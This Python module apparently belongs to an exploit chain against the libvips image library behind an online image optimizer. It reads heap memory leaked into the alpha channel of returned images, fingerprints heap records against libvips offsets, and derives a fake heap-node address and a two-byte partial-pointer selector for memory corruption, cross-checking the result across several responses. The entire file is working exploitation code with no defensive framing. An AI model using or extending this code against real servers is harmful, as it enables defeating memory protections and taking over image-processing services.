#!/usr/bin/env python3
"""Derive the plane-map partial-pointer selector from returned pixels."""

from __future__ import annotations

import hashlib
import io
import struct

from PIL import Image, UnidentifiedImageError

from stack_profile import NativeStackProfile


_QWORD = struct.Struct("<Q")
_RECORD_BEFORE = 6
_RECORD_AFTER = 6


def _qword(alpha: bytes, position: int) -> int:
    return _QWORD.unpack_from(alpha, position)[0]


def _in_pointer_range(value: int, profile: NativeStackProfile) -> bool:
    leak = profile.libvips.leak
    return leak.pointer_min <= value < leak.pointer_max


def _match_record(
    alpha: bytes,
    position: int,
    profile: NativeStackProfile,
    libvips_base: int,
) -> dict[str, object] | None:
    calibration = profile.heap_calibration
    anchor = _qword(alpha, position)
    if not _in_pointer_range(anchor, profile):
        return None
    arena_base = anchor & ~(calibration.arena_alignment - 1)
    peer = anchor + calibration.anchor_peer_delta
    related = _qword(alpha, position - 5 * 8)
    related_delta = related - anchor
    expected_libvips = tuple(
        libvips_base + offset
        for offset in calibration.libvips_record_offsets
    )
    checks = (
        _qword(alpha, position - 6 * 8)
        == calibration.record_chunk_size_and_flags,
        related & ~(calibration.arena_alignment - 1) == arena_base,
        calibration.related_pointer_delta_min
        <= related_delta
        < calibration.related_pointer_delta_max,
        _qword(alpha, position - 4 * 8)
        == arena_base + calibration.arena_sentinel_offset,
        _qword(alpha, position - 3 * 8) == 0,
        _qword(alpha, position - 2 * 8) == 0,
        _qword(alpha, position - 1 * 8) == peer,
        _qword(alpha, position + 1 * 8) == peer,
        _qword(alpha, position + 2 * 8) == expected_libvips[0],
        _qword(alpha, position + 3 * 8) == expected_libvips[1],
        _qword(alpha, position + 4 * 8) == calibration.record_marker,
        _qword(alpha, position + 5 * 8) == 0,
        _qword(alpha, position + 6 * 8) == expected_libvips[2],
    )
    if not all(checks):
        return None
    anchor_page = anchor & ~(calibration.anchor_alignment - 1)
    fake_node = anchor_page + calibration.fake_node_delta_from_anchor_page
    if fake_node & ~(calibration.arena_alignment - 1) != arena_base:
        return None
    selector = fake_node & 0xFFFF
    return {
        "response_offset": hex(position),
        "arena_base": hex(arena_base),
        "arena_sentinel": hex(
            arena_base + calibration.arena_sentinel_offset
        ),
        "related_pointer": hex(related),
        "related_pointer_delta": hex(related_delta),
        "anchor": hex(anchor),
        "anchor_page": hex(anchor_page),
        "anchor_alignment": hex(calibration.anchor_alignment),
        "peer": hex(peer),
        "peer_delta": hex(calibration.anchor_peer_delta),
        "libvips_references": [hex(value) for value in expected_libvips],
        "record_marker": hex(calibration.record_marker),
        "fake_node_delta_from_anchor_page": hex(
            calibration.fake_node_delta_from_anchor_page
        ),
        "derived_fake_node": hex(fake_node),
        "derived_selector": hex(selector),
    }


def analyze_heap_calibration(
    image_bytes: bytes,
    profile: NativeStackProfile,
    libvips_base: int,
) -> dict[str, object]:
    """Return one selector only for one complete heap-record match."""
    if libvips_base & (profile.libvips.leak.base_alignment - 1):
        raise ValueError("libvips base is not page-aligned")
    try:
        with Image.open(io.BytesIO(image_bytes)) as image:
            rgba = image.convert("RGBA")
            width, height = rgba.size
            alpha = rgba.getchannel("A").tobytes()
    except (OSError, UnidentifiedImageError) as error:
        raise ValueError("optimizer response is not a decodable image") from error

    leak = profile.libvips.leak
    start = max(leak.scan_start, _RECORD_BEFORE * 8)
    end = min(
        leak.scan_end,
        len(alpha) - (_RECORD_AFTER + 1) * 8 + 1,
    )
    matches = []
    if start < end:
        for position in range(start, end, leak.scan_step):
            match = _match_record(alpha, position, profile, libvips_base)
            if match is not None:
                matches.append(match)

    matches.sort(key=lambda match: int(str(match["anchor"]), 0))
    rank = profile.heap_calibration.anchor_rank
    selectors = (
        [matches[rank]["derived_selector"]] if rank < len(matches) else []
    )
    status = "no_match" if not selectors else "candidates"
    return {
        "status": status,
        "profile_id": profile.profile_id,
        "libvips_base": hex(libvips_base),
        "response_sha256": hashlib.sha256(image_bytes).hexdigest(),
        "image": {
            "width": width,
            "height": height,
            "alpha_bytes": len(alpha),
        },
        "match_count": len(matches),
        "selected_anchor_rank": rank,
        "matches": matches,
        "candidate_selectors": selectors,
    }


def resolve_heap_selector(
    observations: list[dict[str, object]],
    profile: NativeStackProfile,
) -> int | None:
    """Resolve one selector supported by the configured response count."""
    support: dict[str, list[int]] = {}
    for index, observation in enumerate(observations):
        selectors = observation.get("candidate_selectors", [])
        if not isinstance(selectors, list):
            raise ValueError("heap calibration candidates have an invalid type")
        for selector in set(selectors):
            if not isinstance(selector, str):
                raise ValueError("heap calibration selector has an invalid type")
            support.setdefault(selector, []).append(index)
    eligible = [
        selector for selector, indexes in support.items()
        if len(indexes) >= profile.heap_calibration.minimum_observations
    ]
    if not eligible:
        return None
    if len(eligible) > 1:
        raise ValueError("ambiguous supported heap calibration selectors")
    selector = eligible[0]
    result = int(selector, 0)
    if not 0 <= result <= 0xFFFF:
        raise ValueError("heap calibration selector exceeds two bytes")
    return result
